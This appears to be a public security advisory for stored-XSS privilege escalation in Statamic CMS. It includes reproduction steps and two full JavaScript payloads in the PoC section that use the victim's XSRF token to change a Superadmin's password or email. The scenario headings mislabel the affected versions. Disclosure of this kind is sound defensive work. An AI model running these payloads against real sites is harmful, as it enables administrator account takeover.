# GHSA-g59r-24g3-h7cm
Privilege Escalation in Statamic CMS - Superadmin Account Takeover PoC

> [!IMPORTANT]
> **Responsible Disclosure Notice**  
> This vulnerability was reported to the vendor/maintainer ([Statamic](https://github.com/statamic)) following a responsible disclosure process.  
> The maintainer was given more than **90 days** to acknowledge the security advisory and provide a fix, in line with industry-standard disclosure policies.  
> Despite multiple attempts to establish communication, there was **no cooperation, no response, and a clear lack of good will from the maintainer** to address the issue.
>  
> The **CVE has not yet been assigned solely due to the unresponsiveness of the maintainer**, not due to a lack of technical validity or impact.  
> The CVE request is currently in progress and will be finalized through public disclosure channels.


### Summary
There is a critical privilege escalation vulnerability in the Laravel-based content management system **Statamic CMS** that can be exploited to take over a Superadmin account. This issue comes from a combination of stored Cross-Site Scripting (XSS) vulnerabilities, which remain exploitable up to version `5.22.0` and are patched in version `5.22.1`. 

These vulnerabilities allow attackers to run malicious JavaScript in the victim's browser. A low-privileged user can inject harmful content into the **Statamic CMS**, setting a trap for the Superadmin. When the Superadmin accesses this content, the exploit runs in their session, enabling the attacker to gain higher privileges and potentially take over the system.

This problem is also related to the lack of proper server-side validation of the X-CSRF-TOKEN used in PATCH requests, which makes it easier for the attacker to change important account details like the Superadmin's password or email address.

This advisory explains the technical details, provides proof-of-concept exploits, and discusses the risks posed by these vulnerabilities, focusing on how the attack can be carried out.

### Vulnerability Overview
#### Severity: **Critical**
#### Affected Versions: **Up to and including the latest version 5.22.0**

This vulnerability is a chain attack that leverages stored XSS to escalate privileges within the CMS. It is essential to note that for this attack to be successful, the Superadmin must either click on a malicious link sent by an attacker or simply visit a compromised Collection or Taxonomy within the CMS. Once the Superadmin interacts with the infected content, the malicious JavaScript code is executed in their browser, leading to one of two potential outcomes:

1. **In versions ≤ 5.21.0**: The attacker can automatically change the Superadmin's password without requiring the current password, effectively locking the legitimate user out of their account.
2. **In version 5.22.0**: Although the password change mechanism has been secured, the attacker can still change the email address associated with the Superadmin account. This allows the attacker to initiate a password reset, gain control of the account, and access the system with the highest level of privileges.


### Steps to Reproduce

The following steps outline how to reproduce the vulnerability that allows for Superadmin account takeover via Stored Cross-Site Scripting (XSS) and insufficient X-CSRF-TOKEN validation:

1. **Create a Superadmin Account ("User1"):**
   - If this is a fresh installation, create a Superadmin account within the CMS. This account will be referred to as "User1."

2. **Create a Low-Privileged User ("User2"):**
   - Using the Superadmin account ("User1"), create a new user with low-level privileges, referred to as "User2."
   - Assign "User2" access to the Control Panel, the User list, and grant read-write permissions to Collections and/or Taxonomies.

3. **Initiate a Session as "User2":**
   - Log in as "User2" to the CMS.

4. **Inject Malicious Script:**
   - Create a new Collection or Taxonomy within the CMS as "User2."
   - Inject a malicious JavaScript payload into one of the fields that will be stored and rendered when viewed by the Superadmin.

5. **Trigger the Exploit:**
   - Wait for "User1" (the Superadmin) to access the compromised Collection or Taxonomy. This can be done by either:
     - Sending a phishing link that directs "User1" to the infected content.
     - Simply waiting for "User1" to browse the Collections or Taxonomies naturally.

6. **Observe the Outcome:**
   - Depending on the CMS version:
     - **Version ≤ 5.21.0:** The malicious script will change the Superadmin's password without requiring the current password, effectively locking the legitimate user out of their account.
     - **Version 5.22.0:** The malicious script will change the Superadmin's email address, allowing the attacker to initiate a password reset and gain control over the account.

These steps demonstrate how a low-privileged user can set up a trap for the Superadmin by exploiting the stored XSS vulnerability. The lack of proper server-side validation of the X-CSRF-TOKEN in PATCH requests makes it possible to carry out this attack, leading to a complete takeover of the Superadmin account.


### Details
The root cause of this vulnerability lies in insufficient input sanitization and validation across several components of the CMS. Specifically, the vulnerability allows for the injection of JavaScript code into forms used for creating or editing Collections, Taxonomies or Forms. These forms do not properly sanitize user input, allowing an attacker to store malicious scripts that execute when a Superadmin interacts with the compromised content.

In previous versions of the CMS, such as version 4.42.0, user inputs in certain views were not properly sanitized before being rendered on the page. For instance, in the `resources/views/partials/nav-main.blade.php` file, the variable `$item->name()` was rendered without adequate escaping or encoding. This lack of sanitization allowed attackers to inject arbitrary JavaScript code.

It looks like the vulnerability related to improper sanitization of user input, such as those found in version 4.42.0 of the Statamic CMS, is still present in the software, despite partial mitigations that have been implemented. In previous versions, like 4.42.0, user input in certain views, including the `resources/views/partials/nav-main.blade.php` file, were not adequately sanitized before being rendered on the page.

At the time of reporting the Multiple Stored Cross-Site Scripting vulnerability, version 4.42.0 was the latest available version of the Statamic CMS. Now, the software has been updated to version 5.22.0. While some improvements, such as the introduction of the `v-pre` directive, have been made to mitigate XSS risks in specific components, these mitigations appear to be incomplete. The underlying issue of inadequate input sanitization persists in other parts of the software.

For further details on the changes made, including the use of `v-pre`, please refer to the Reference section at the bottom of this Security Advisory. There is a link to a commit that shows the differences between certain versions of the affected file, highlighting the partial mitigation that was applied.

### PoC
#### Scenario 1: Superadmin Password Change (Version == 5.21.0)
> [!IMPORTANT] 
> In the `5.21.0` version, the CMS's password change mechanism did not require the current password. This allows an attacker to execute a stored XSS payload that automatically changes the Superadmin's password. The attack can be triggered by the Superadmin merely visiting a compromised Collection or Taxonomy or clicking on a malicious link.

**Exploit:**

```javascript
{{constructor.constructor("(function(){function getXsrfToken(){var token=decodeURIComponent(document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1]);return token.endsWith('%3D')?token.replace(/%3D$/, '='):token;}var req=new XMLHttpRequest();req.onload=function(){var changeReq=new XMLHttpRequest();changeReq.open('PATCH','http://0.0.0.0/cp/users/<Superadmin's UUID>/password',true);changeReq.setRequestHeader('Content-Type','application/json');changeReq.setRequestHeader('X-Requested-With','XMLHttpRequest');changeReq.setRequestHeader('X-XSRF-TOKEN',getXsrfToken());changeReq.send(JSON.stringify({current_password:null,password:'987654321',password_confirmation:'987654321'}));};req.open('GET','/cp/users/<Superadmin's UUID>/edit',true);req.send();})()")()}}
```

#### Scenario 2: Superadmin Email Address Change (Version ≤ 5.21.0)
> [!IMPORTANT] 
> In the latest version (5.22.0), the password change mechanism was hardened by requiring the current password. However, the stored XSS vulnerability still allows an attacker to change the email address associated with the Superadmin account. By altering the email address, the attacker can initiate a password reset process, gaining control over the account.

**Exploit:**

```javascript
{{constructor.constructor("(function(){function getXsrfToken(){var token=decodeURIComponent(document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1]);return token.endsWith('%3D')?token.replace(/%3D$/, '='):token;}var req=new XMLHttpRequest();req.onload=function(){var changeReq=new XMLHttpRequest();changeReq.open('PATCH','http://0.0.0.0/cp/users/<Superadmin's UUID>',true);changeReq.setRequestHeader('Content-Type','application/json');changeReq.setRequestHeader('X-Requested-With','XMLHttpRequest');changeReq.setRequestHeader('X-XSRF-TOKEN',getXsrfToken());changeReq.send(JSON.stringify({name:'wojt',email:'wojtek@wojtek.com',roles:[],groups:[],id:'9f4d7960-bf66-4af4-8c30-b09eb24e06ea'}));};req.open('GET','/cp/users/<Superadmin's UUID>/edit',true);req.send();})()")()}}
```

### Impact
The successful exploitation of this vulnerability allows an attacker to gain full control over the Superadmin account, leading to:

- Complete administrative access to the Statamic CMS.
- Potential for lateral movement within the application.
- Significant risk of data leakage, modification, or deletion.
- Undermining the integrity and confidentiality of the entire Statamic CMS ecosystem.

### References
- https://github.com/statamic/cms/pull/9256/commits/d9f1e916556e749a03fba6163de6cd67c3830ffd

---

**PoC video:**

[![Watch the PoC on YouTube](https://img.youtube.com/vi/qx8axpmTz1E/maxresdefault.jpg)](https://www.youtube.com/watch?v=qx8axpmTz1E)

